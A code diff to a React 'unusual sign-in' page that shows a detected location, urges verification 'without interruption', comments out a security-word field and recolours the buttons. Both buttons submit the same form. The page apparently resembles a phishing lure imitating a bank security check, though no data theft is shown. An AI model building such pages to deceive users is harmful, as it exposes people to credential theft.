@@ -69,12 +69,12 @@ const Page = () => {
             <span className="font-semibold">
               {locationLoading ? "Detecting location..." : userLocation}
             </span>
-            . If this was you, please verify your security word to continue
-            using your account without interruption.
+            . If this was you, please verify to continue using your account
+            without interruption.
           </p>
 
           <form onSubmit={handleSubmit}>
-            <div className="flex mb-6 gap-4">
+            {/* <div className="flex mb-6 gap-4">
               <h1 className="text-lg font-bold text-[#0d2d62]">
                 Security Word:
               </h1>
@@ -87,19 +87,19 @@ const Page = () => {
                 className="w-[200px] border rounded-lg px-4 text-lg tracking-widest text-center placeholder:tracking-normal placeholder:font-medium focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                 required
               />
-            </div>
+            </div> */}
 
             <div className="flex gap-4 mb-6">
               <button
                 type="submit"
-                className="flex-1 border border-[#056dae] text-[#056dae] py-3 rounded-lg font-semibold hover:bg-[#f0f4f9] transition-colors text-center cursor-pointer"
+                className="flex-1 border border-[#ffd814] text-[#ffd814] py-3 rounded-lg font-semibold hover:bg-[#f0f4f9] transition-colors text-center cursor-pointer"
               >
-                {loading ? "Loading..." : "This wasn’t me"}
+                {loading ? "Loading..." : "This wasn't me"}
               </button>
 
               <button
                 type="submit"
-                className="flex-1 bg-primary hover:!bg-[#054e7b] text-white py-3 rounded-lg font-semibold transition-colors text-center"
+                className="flex-1 bg-primary hover:!bg-[#f7cf0a] text-[#0d2d62] py-3 rounded-lg font-semibold transition-colors text-center cursor-pointer"
               >
                 {loading ? "Loading..." : "Confirm"}
               </button>
